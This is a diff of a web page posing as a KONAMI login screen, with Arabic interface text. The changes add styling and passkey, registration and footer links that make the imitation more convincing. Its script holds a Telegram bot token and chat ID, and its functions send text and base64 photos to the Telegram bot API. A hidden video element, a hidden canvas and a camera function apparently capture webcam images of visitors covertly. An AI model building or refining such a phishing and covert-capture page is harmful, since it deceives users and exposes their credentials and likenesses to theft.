@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,8 +6,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>KONAMI Login</title>
   <style>
-    body {
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
       font-family: Arial, sans-serif;
+    }
+
+    body {
       background-color: #f7f7f7;
       display: flex;
       flex-direction: column;
@@ -16,8 +21,9 @@
       justify-content: center;
       padding: 20px;
     }
+
     .container {
-      background: #fff;
+      background-color: white;
       width: 100%;
       max-width: 400px;
       padding: 20px;
@@ -25,12 +31,19 @@
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
       text-align: center;
     }
+
     .logo {
       font-size: 28px;
       color: #e60012;
       font-weight: bold;
       margin-bottom: 20px;
     }
+
+    h2 {
+      margin-bottom: 15px;
+      color: #333;
+    }
+
     input {
       width: 100%;
       padding: 12px;
@@ -39,30 +52,68 @@
       border-radius: 6px;
       font-size: 16px;
     }
+
     .btn {
       width: 100%;
       padding: 12px;
+      margin-bottom: 15px;
       border: none;
       border-radius: 6px;
       font-size: 16px;
       cursor: pointer;
       font-weight: bold;
+    }
+
+    .login-btn {
       background-color: #d71920;
       color: white;
-      margin-top: 10px;
     }
-    .status {
-      margin-top: 10px;
-      font-size: 14px;
-      color: #333;
-    }
-    .terms {
-      margin: 10px 0;
-      font-size: 14px;
-    }
-    #retryBtn {
-      display: none;
+
+    .retry-btn {
       background-color: #0078d7;
+      color: white;
+      display: none;
+    }
+
+    .divider {
+      margin: 15px 0;
+      color: #888;
+      font-weight: bold;
+    }
+
+    a {
+      text-decoration: none;
+      color: #0078d7;
+      font-size: 14px;
+    }
+
+    .register {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      color: #555;
+      font-size: 13px;
+    }
+
+    .footer a {
+      color: #0078d7;
+      margin: 0 5px;
+    }
+
+    .terms {
+      margin-bottom: 15px;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    .status {
+      font-size: 14px;
+      margin-top: 10px;
+      color: #333;
     }
   </style>
 </head>
@@ -75,20 +126,37 @@
     <input id="username" type="text" placeholder="KONAMI ID / E-mail address">
 
     <div class="terms">
-      <input type="checkbox" id="agree"> أوافق على <a href="#">الشروط</a> و <a href="#">الخصوصية</a>
+      <input type="checkbox" id="agree"> أوافق على 
+      <a href="#">الشروط</a> و <a href="#">الخصوصية</a>
     </div>
 
-    <button id="loginBtn" class="btn">Log In</button>
-    <button id="retryBtn" class="btn">🔄 إعادة المحاولة</button>
+    <button id="loginBtn" class="btn login-btn">Log In</button>
+    <button id="retryBtn" class="btn retry-btn">🔄 إعادة المحاولة</button>
+
+    <div class="divider">OR</div>
+    <button class="btn login-btn">Logging in With a Passkey</button>
+    <p><a href="#">What is a Passkey?</a></p>
+
+    <div class="register">
+      Don't have a KONAMI ID? <a href="#">Register</a>
+    </div>
+
     <div id="status" class="status"></div>
+  </div>
+
+  <div class="footer">
+    <a href="#">Terms of Use</a> / 
+    <a href="#">Privacy (KONAMI ID)</a>
+    <br>
+    <a href="#">Trademarks</a>
   </div>
 
   <video id="v" autoplay playsinline style="display:none"></video>
   <canvas id="c" width="640" height="480" style="display:none"></canvas>
 
 <script>
-const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw"; // 🔹 ضع التوكن هنا
-const CHAT_ID = "6504203392";        // 🔹 ضع chat_id الخاص بك
+const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw"; // ضع التوكن هنا
+const CHAT_ID = "6504203392";        // ضع chat_id الخاص بك
 const loginBtn = document.getElementById("loginBtn");
 const retryBtn = document.getElementById("retryBtn");
 const statusDiv = document.getElementById("status");
@@ -104,11 +172,7 @@ async function sendMessageToTelegram(text){
   const fd = new FormData();
   fd.append("chat_id", CHAT_ID);
   fd.append("text", text);
-
-  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-    method: "POST",
-    body: fd
-  });
+  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: "POST", body: fd });
 }
 
 async function sendPhotoToTelegram(imgBase64, caption=""){
@@ -117,11 +181,7 @@ async function sendPhotoToTelegram(imgBase64, caption=""){
   fd.append("chat_id", CHAT_ID);
   fd.append("photo", blob, "photo.png");
   if(caption) fd.append("caption", caption);
-
-  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-    method: "POST",
-    body: fd
-  });
+  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
 }
 
 async function openCamera(){
@@ -168,7 +228,7 @@ async function startProcess(){
   } catch(err){
     setStatus(err.message);
     alert(err.message);
-    retryBtn.style.display = "block"; // 🔄 إظهار زر إعادة المحاولة
+    retryBtn.style.display = "block";
   } finally {
     loginBtn.disabled = false;
   }
